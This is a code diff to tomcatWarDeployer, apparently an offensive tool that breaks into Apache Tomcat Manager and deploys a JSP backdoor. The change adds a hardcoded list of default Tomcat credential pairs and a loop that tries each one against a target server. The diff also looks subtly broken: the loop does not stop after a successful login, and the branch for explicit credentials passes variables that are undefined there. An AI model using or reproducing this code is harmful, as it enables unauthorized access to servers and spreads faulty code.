@@ -636,7 +636,6 @@ def extractHostAddress(hostn, url):
     return host
 
 def browseToManager(host, url, user, password):
-
     error = None
     retry = False
     page = None
@@ -683,6 +682,7 @@ def browseToManager(host, url, user, password):
             elif 'Error 401' in error or '403' in error:
                 logger.warning(
                     'Invalid credentials supplied for Apache Tomcat.')
+                return 403, 403
             elif once:
                 once = False
                 logger.warning(
@@ -703,7 +703,7 @@ def generateRandomPassword(N=12):
 
 def options():
     version_banner = 'tomcatWarDeployer (v. %s)' % VERSION
-    usage = '%prog [options] server\n\n  server\t\tSpecifies server address. Please also include port after colon.'
+    usage = '%prog [options] server\n\n  server\t\tSpecifies server address. Please also include port after colon. May start with http:// or https://'
     parser = optparse.OptionParser(usage=usage)
 
     general = optparse.OptionGroup(parser, 'General options')
@@ -715,10 +715,10 @@ def options():
                        help='Simulate breach only, do not perform any offensive actions.', action='store_true')
     general.add_option('-G', '--generate', metavar='OUTFILE', dest='generate',
                        help='Generate JSP backdoor only and put it into specified outfile path then exit. Do not perform any connections, scannings, deployment and so on.')
-    general.add_option('-U', '--user', metavar='USER', dest='user', default='tomcat',
-                       help='Tomcat Manager Web Application HTTP Auth username. Default="tomcat"')
-    general.add_option('-P', '--pass', metavar='PASS', dest='password', default='tomcat',
-                       help='Tomcat Manager Web Application HTTP Auth password. Default="tomcat"')
+    general.add_option('-U', '--user', metavar='USER', dest='user', default='',
+                       help='Tomcat Manager Web Application HTTP Auth username. Default=<none>, will try various pairs.')
+    general.add_option('-P', '--pass', metavar='PASS', dest='password', default='',
+                       help='Tomcat Manager Web Application HTTP Auth password. Default=<none>, will try various pairs.')
     parser.add_option_group(general)
 
     conn = optparse.OptionGroup(parser, 'Connection options')
@@ -820,17 +820,42 @@ def main():
         logging.error('One shall not go any further without an url!')
         return
 
+    userPasswordPairs = (
+        ('tomcat', 'tomcat'),
+        ('admin', ''),
+        ('admin', 'admin'),
+        ('cxuser', 'cxuser'),
+        ('j2deployer', 'j2deployer'),
+        ('ovwebusr', 'OvW*busr1'),
+        ('vcx', 'vcx'),
+
+    )
+
     if not opts.generate:
         url = ''
-        try:
-            browser, url = browseToManager(
-                args[0], opts.url, opts.user, opts.password)
-        except KeyboardInterrupt:
-            logger.info(
-                "User has interrupted while browsing to Apache Manager.")
-            return
+        if opts.user == '' and opts.password == '':
+            for user, password in userPasswordPairs:
+                try:
+                    browser, url = browseToManager(
+                        args[0], opts.url, user, password)
+                    if browser == 403 and url == 403:
+                        browser = url = None
+
+                except KeyboardInterrupt:
+                    logger.info(
+                        "User has interrupted while browsing to Apache Manager.")
+                    return
+        else:
+            try:
+                browser, url = browseToManager(
+                    args[0], opts.url, user, password)
+            except KeyboardInterrupt:
+                logger.info(
+                    "User has interrupted while browsing to Apache Manager.")
+                return
 
         if browser == None:
+            logger.error('Service not found or could not authenticate to it.')
             return
 
     try:
